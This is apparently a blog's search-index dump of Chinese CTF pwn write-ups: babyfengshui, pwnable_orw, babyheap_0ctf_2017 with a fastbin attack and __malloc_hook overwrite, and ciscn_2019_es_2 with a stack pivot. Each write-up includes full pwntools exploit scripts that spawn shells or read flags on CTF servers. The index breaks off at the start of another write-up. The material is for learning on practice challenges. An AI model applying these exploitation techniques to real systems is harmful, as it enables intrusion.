return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, name: bytes, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;0\u0026#34;) sendline_after_clean(str(size)) sendline_after_clean(name) sendline_after_clean(str(len(content))) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) def show(index: int) -\u0026gt; bytes: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) p.recvuntil(b\u0026#34;name: \u0026#34;) received = {} received[\u0026#39;name\u0026#39;] = p.recvline() p.recvuntil(b\u0026#34;description: \u0026#34;) received[\u0026#39;description\u0026#39;] = p.recv(4) print(received) return received def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) sendline_after_clean(content) allocate(0x80, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;) # 0 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 1 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 2 remove(0) # gdb.attach(p) # input() allocate(0x100, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 3 # allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 4 # gdb.attach(p) payload = flat([ b\u0026#34;a\u0026#34;*0x108, 0, 0x89, b\u0026#34;a\u0026#34;*0x80, 0, 0x89, m_elf.got[\u0026#39;free\u0026#39;] ]) change(3, payload) # gdb.attach(p) free_addr = ug(show(1)[\u0026#39;description\u0026#39;].ljust(4, b\u0026#34;\\x00\u0026#34;)) libc_base = free_addr - libc.sym[\u0026#39;free\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] suclog( free_addr=free_addr, libc_base=libc_base, system_addr=system_addr ) payload = flat(system_addr) change(1, payload) remove(2) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%BB%95%E8%BF%87%E5%A0%86%E6%BA%A2%E5%87%BA%E9%99%90%E5%88%B6buuctf-babyfengshui_33c3_2016/","section":"writeup","summary":"原题链接 查看程序架构 ida伪代码 可以看到是标准的菜单堆题 allocate 这里自定义了结构体 在ends处按d新建域，光标在具体的域上按d会清空 这个函数就是一个结构体申","tags":["pwn","绕过堆溢出限制"],"title":"【绕过堆溢出限制】BUUCTF babyfengshui_33c3_2016"},{"categories":["writeup"],"contents":"原题链接\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804858A c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: if not isinstance(until, bytes): until = bytes(until, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(until) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) p.send(content) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) send_after_clean(content + p.newline, until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: if isinstance(prev_string, str): prev_string = bytes(prev_string, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(prev_string) if bound is not None and isinstance(bound, str): bound = bytes(bound, encoding=\u0026#34;UTF-8\u0026#34;) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... shellcode = 0x804A060 flag = shellcode + 0x30 + 8 # 需要自行设定offset # 生成orw的shellcode payload = flat([ asm(shellcraft.open(\u0026#34;./flag\u0026#34;)), asm(shellcraft.read(\u0026#39;eax\u0026#39;, \u0026#39;esp\u0026#39;, 0xff)), asm(shellcraft.write(1, \u0026#39;esp\u0026#39;, 0xff)) ]) # payload = payload.ljust(0x30, b\u0026#34;\\x00\u0026#34;) + b\u0026#34;./flag\\x00\u0026#34; sendline_after_clean(payload, \u0026#34;Give my your shellcode:\u0026#34;) interactive_after_clean() 没啥好讲的，就是一个生成orw的shellcode的题目，记一下orw的shellcode的生成函数就好\n","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%94%9F%E6%88%90orw-shellcodebuuctf-pwnable_orw/","section":"writeup","summary":"原题链接 exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal =","tags":["pwn","生成ORW shellcode"],"title":"【生成ORW shellcode】BUUCTF pwnable_orw"},{"categories":["writeup"],"contents":"原题链接\n这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误烦请斧正\n参考文章 checksec 查看程序架构 ida 查看程序伪代码 allocate fill Free dump 基本思路 构建 exp 针对四个选项编写四个输入函数 得到初始 chunk 安排指向 chunk 4 的指针 将chunk 4放进unsorted bin中获取libc基址 覆写任意地址的数据 完整exp 参考文章 0ctf2017 babyheap 【PWN系列】 Buuctf babyheap_0ctf_2017 Writeup babyheap_0ctf_2017 堆技巧 ctfwiki 堆概述 checksec 查看程序架构 $ checksec --file babyheap_0ctf_2017 [*] \u0026#39;/home/peterl/security/workspace/babyheap_0ctf_2017/babyheap_0ctf_2017\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ida 查看程序伪代码 这个程序故意把.symtab节删掉了，所以没有函数名称，这里作者在 ida 中简单地重命名了一下\nallocate 这个函数会分配一个大小小于 4096 的内存块（不存在符号位漏洞），而我们知道这个内存块会是从 top_chunk 中分割出来的：\n然后，malloc 会返回指向 chunk 中size 的尾部，user_data 的首部，同时也是 fd 指针的首部的指针，而这个指针会存放在一个大数组中，而这个大数组是以三个单元为一个实体的，可以看作它是一个结构体数组，这个结构体数组的构造如下：\nfill 这个函数在检查内存是否可用（标志是否为 1）后会向对应索引的内存中填入任意大小的数据，这个数据长度是由用户随意指定的！！这里就出现了堆溢出漏洞\nFree 在检查标志位是否为 1 后，它会将标识位、size 置零，并释放内存\ndump 这个函数在检查标志位是否为 1 后，会将内存中的内容打印出来\n基本思路 我们想一下这么一件事：在我们的结构体数组中，理论上每一个结构体内的内存地址是不一样的，而且如果内存被释放，标志位也会被置零，从而也就无法访问。\n那么问题来了，如果我们让两个结构体内的指针都指向同一块内存，那么就算这块内存已被释放，我们仍然可以通过另一个指针访问这块已被释放的空间\n同时，我们知道三件事：\n当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节） 如果 unsorted bin 内有且仅有一块 chunk 时，这块 chunk 的 fd 指针和 bk 指针都会指向main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 如果malloc_hook存在，malloc会先调用__malloc_hook的值指向的函数 那么，假设我们能获得一个指向 unsorted bin 中唯一 chunk 的指针，我们就能成功获得 libc 基址。\n而如果我们拥有了一个指向 fast bin 中 chunk 的指针，那么我们就能够更改其 fd 指针，从而控制 malloc 到的地址的值，从而我们能够修改任何地址的内容\n然后，我们就可以更改__malloc_hook的值，从而更改malloc的行为\n构建 exp 针对四个选项编写四个输入函数 def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] 得到初始 chunk 我们需要分配几个 chunk，其中有且仅有一个大小超过 fast bin 的限制，会被放进 unsorted bin 中\n然后我们会 allocate 两次，一次是正常的 fast bin 里面的内容，一次指向会被放入 unsorted bin 中的大 chunk。\n那么我们可以先划出 4 个 0x10 的 chunk（size 位=prev_size+size+prev_inuse+0x10=0x20），再划出一块 0x80 大小的 chunk 用以放进 unsorted bin 中：\n因此我们可以初始分配五个 chunk：\nallocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) 安排指向 chunk 4 的指针 我们只要覆写了 chunk 2 的 fd 指针，让它指向 chunk 4，那么我们在第二次 allocate 的时候，得到的就是指向 chunk 4 的指针\n具体步骤：\n这里我们先把 chunk 1 和 chunk 2 free 掉，这样子 chunk 1 和 chunk 2 的fd指针就生效了。\n又因为我们可以向一块chunk内填入任意大小的数据，我们就可以通过将payload1填进chunk0用以覆写chunk2的fd指针\n然后为了保证chunk4被正确分配，我们可以将payload2填入chunk3中，用以覆写chunk4的size\n这里要注意的是，chunk 4 的 size 位要设置成 0x21，不然在allocate(0x10)的时候，因为大小不一样，malloc 时是没有办法分配到 chunk 4 的\n然后我们就可以allocate两次，第二次分配到的就是chunk4了，这时chunk2指向的也是chunk4了。\n需要注意的是，我们需要将chunk 4 的size位恢复原状，因为我们下一步是要把chunk 4放入unsorted bin中\nfree(1) free(2) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) # 覆盖size位 payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) # 得到chunk4指针 allocate(0x10) # 恢复size位 payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) 将chunk 4放进unsorted bin中获取libc基址 我们不能直接把chunk 4 free掉，因为chunk 4和top chunk相邻，直接free掉会使chunk 4并入top chunk\n因此我们allocate一个chunk 5，然后free掉chunk 4，又因为此时chunk 4虽然由于标志位为0不可访问，但是chunk 2仍能被dump函数识别为未释放的空间，从而读取内容。\n因此，我们直接dump chunk 2，减去固定值0x3c4b78，就得到了libc基址\nallocate(0x80) free(4) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) 覆写任意地址的数据 当我们通过覆写chunk 2的fd位的时候，我们应该已经发现了，通过这种方式，我们可以将fd位覆写为任意我们喜欢的地址\n我们可以通过覆写code段中的__malloc_hook函数来改变malloc的行为，这个函数的详细说明见此，这里贴一段我们这个程序要用到的说明：\n可以看到，__malloc_hook函数的值是malloc会在它被call的时候使用的函数指针，所以，我们只需要更改__malloc_hook的值，我们就能更改malloc的行为\n__malloc_hook函数的偏移存在sym表中：\n$ readelf -aW libc-2.23.so | grep hook 00000000003c3dc8 000006fb00000006 R_X86_64_GLOB_DAT 00000000003c67b0 __malloc_initialize_hook@@GLIBC_2.2.5 + 0 00000000003c3ea8 000001e700000006 R_X86_64_GLOB_DAT 00000000003c9560 argp_program_version_hook@@GLIBC_2.2.5 + 0 00000000003c3eb0 0000072200000006 R_X86_64_GLOB_DAT 00000000003c67a0 __after_morecore_hook@@GLIBC_2.2.5 + 0 00000000003c3ee0 000008ae00000006 R_X86_64_GLOB_DAT 00000000003c4b00 __memalign_hook@@GLIBC_2.2.5 + 0 00000000003c3ef0 0000044000000006 R_X86_64_GLOB_DAT 00000000003c4b10 __malloc_hook@@GLIBC_2.2.5 + 0 00000000003c3ef8 000000d600000006 R_X86_64_GLOB_DAT 00000000003c67a8 __free_hook@@GLIBC_2.2.5 + 0 00000000003c3fd0 000005cb00000006 R_X86_64_GLOB_DAT 00000000003c4b08 __realloc_hook@@GLIBC_2.2.5 + 0 214: 00000000003c67a8 8 OBJECT WEAK DEFAULT 34 __free_hook@@GLIBC_2.2.5 487: 00000000003c9560 8 OBJECT GLOBAL DEFAULT 34 argp_program_version_hook@@GLIBC_2.2.5 958: 00000000003c92e0 8 OBJECT GLOBAL DEFAULT 34 _dl_open_hook@@GLIBC_PRIVATE 1088: 00000000003c4b10 8 OBJECT WEAK DEFAULT 33 __malloc_hook@@GLIBC_2.2.5 1483: 00000000003c4b08 8 OBJECT WEAK DEFAULT 33 __realloc_hook@@GLIBC_2.2.5 1787: 00000000003c67b0 8 OBJECT WEAK DEFAULT 34 __malloc_initialize_hook@@GLIBC_2.2.5 1826: 00000000003c67a0 8 OBJECT WEAK DEFAULT 34 __after_morecore_hook@@GLIBC_2.2.5 2222: 00000000003c4b00 8 OBJECT WEAK DEFAULT 33 __memalign_hook@@GLIBC_2.2.5 注意，因为默认输出宽度限制的原因，只用readelf -a命令无法输出__malloc_hook而是__m[\u0026hellip;]，必须加上-W或者--width选项才能加宽\n这里有一个小技巧，在__malloc_hook-0x23处malloc可以使size位刚好为0x7f，这样子就可以更改__malloc_hook的值\n我们再用one_gadget命令找一下可用的gadget：\n$ one_gadget libc-2.23.so 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL 因为有些gadget对栈有要求，所以只有一些可以用。试了一下，第二个刚好是可以用的\nallocate(0x60) free(4) # 更改fd指针 payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # 更改__malloc_hook的值 # prev_size+size=0x10，然后要填充0x13的空位才能到__malloc_hook的位置 payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) 然后allocate任意一个值就可以得到shell啦\n完整exp from pwn import * from pwn import p64, p32, u32, u64, p8 import sys from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyheap_0ctf_2017\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;25943\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x1329\u0026#34;) else: p = process([\u0026#34;ld-2.23.so\u0026#34;, fn], env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) # p = process(fn) libc = ELF(libc_name) def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) # gdb.attach(p) free(1) free(2) # gdb.attach(p) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) allocate(0x10) payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) allocate(0x80) free(4) # gdb.attach(p) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) allocate(0x60) free(4) # gdb.attach(p) payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # gdb.attach(p) payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) # gdb.attach(p) allocate(0x10) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/","section":"writeup","summary":"原题链接 这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误烦请斧正 参考文章 checksec 查看程序架构 ida 查看程","tags":["pwn","首道堆题","fastbin attack","unsorted bin main_arena leak"],"title":"【首道堆题】【fastbin attack】【unsorted bin main_arena leak】babyheap_0ctf_2017"},{"categories":["writeup"],"contents":"【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 原题链接\n【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看程序伪代码 构建exp 栈迁移的基本思路 泄露ebp 开始栈迁移 完整exp checksec查看程序架构 $ checksec --file ciscn_2019_es_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没啥特殊的，注意一下32位就可\nida查看程序伪代码 看起来像是栈溢出，但是read函数限制了读入的字节数，我们看一下栈：\n我们发现这时候到return的位置只能溢出一个字，如果这时候程序有一个backdoor函数那就万事大吉。\n我们可以找一下，发现了一个hack函数，但这个hack函数完全就是糊弄人的，从中唯一得到的有用信息是system确乎存在于plt表中，这样就不用ret2libc了：\n看一下源程序也没有格式化字符串漏洞，我们可以考虑栈迁移\n我们只要泄露出ebp，然后再通过第二次leave;ret就可以将esp更改到我们希望的地方\n构建exp 栈迁移的基本思路 我们知道，在call一个函数的时候，我们会先将下一条指令的地址进栈，再将当前的ebp进栈，然后将当前esp的值赋给ebp，这样就实现了备份下一条指令的地址、ebp原本的值、esp原本的值的作用\n然后等到函数结束时，程序会执行leave指令和ret指令。leave指令相当于mov esp, ebp; pop ebp，意思就是从备份中先恢复esp再恢复ebp；ret指令相当于pop eip，意思就是恢复备份的指令地址，这样就能执行函数调用的下一条语句了\n那么如果我们更改栈中备份的ebp数据的同时，在程序执行过一次leave; ret后再执行一遍，那么因为ebp的备份已被更改，所以ebp恢复的就是我们希望的数据，而再执行一遍leave; ret时，程序是假定ebp中保存的是esp的备份，那么通过这种方法，我们就可以成功地更改esp。\n这时我们已经让栈顶指针指向了我们希望的位置，这时由于leave指令，程序会将我们伪造的栈顶的第一个数据pop进ebp，然后由于ret指令再将第二个数据弹进eip中，那么我们就应该在伪造的栈的第二个数据放入system函数的地址\n然后我们就可以当普通的栈溢出构造栈了。\nsystem后面跟个0，再跟/bin/sh的地址就🆗了\n泄露ebp 我们看到源程序中：\nmemset(s, 0, 0x20u); read(0, s, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, s); 这个s字符数组被初始化为全\\0，此时如果我们将该数组所有的位都覆盖为垃圾数据，那么由于数组中没有\\0了，它就会把紧跟在s后面的数据一齐打印出来，直到遇到一个\\0为止。\n这里需要注意的是如果我们使用sendline函数，程序读入的字符最后会多一个\\n，所以这里发送payload应该用send。同时在payload中使用一个与前面不同的字符做哨兵：\npayload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; p.clean() p.send(payload) 也就是说我们只要满足：\n刚好输入0x28个数据 输入的最后一个字符与前面输入的不同 就可以了\n那么sendline函数也不是不可以用：\npayload = b\u0026#34;a\u0026#34;*0x27 p.clean() p.sendline(payload) 用\\n字符做哨兵就可以了。\n然后我们就可以recvebp地址了：\np.recvuntil(b\u0026#34;b\u0026#34;) ebp_addr = u32(p.recv(4)) # 我们可以讲礼貌一点，栈迁移完后返回地址和原来一样 eip_addr = u32(p.recv(4)) 开始栈迁移 我们用gdb调试一下，发现当恢复ebp备份值的时候，这个备份值比当时ebp的值刚好多0x10：\n那么我们的payload就出来了：\nleave_ret = 0x080484b8 # command也可以是cat flag command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) 完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./ciscn_2019_es_2\u0026#34; # libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485FD\u0026#34;) else: p = process(fn) m_elf = ELF(fn) p.clean() payload1 = b\u0026#34;a\u0026#34;*0x27 p.sendline(payload1) p.recvuntil(b\u0026#34;\\n\u0026#34;) ebp_addr = u32(p.recv(4)) eip_addr = u32(p.recv(4)) success(hex(ebp_addr)) p.clean() leave_ret = 0x080484b8 command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/","section":"writeup","summary":"【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 原题链接 【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看","tags":["pwn","栈迁移"],"title":"【栈迁移例题解析】ciscn_2019_es_2"},{"categories":["writeup"],"contents":"【Write-up】BUUCTF ciscn_2019_ne_5 原题链接\n【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构建exp checksec查看程序架构 $ checksec --file ciscn_2019_ne_5 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_ne_5/ciscn_2019_ne_5\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = \u0026amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\u0026#34;Welcome to use LFS.\u0026#34;); printf(\u0026#34;Please input admin password:\u0026#34;); __isoc99_scanf(\u0026#34;%100s\u0026#34;, s1); if ( strcmp(s1, \u0026#34;administrator\u0026#34;) ) { puts(\u0026#34;Password Error!\u0026#34;); exit(0); } 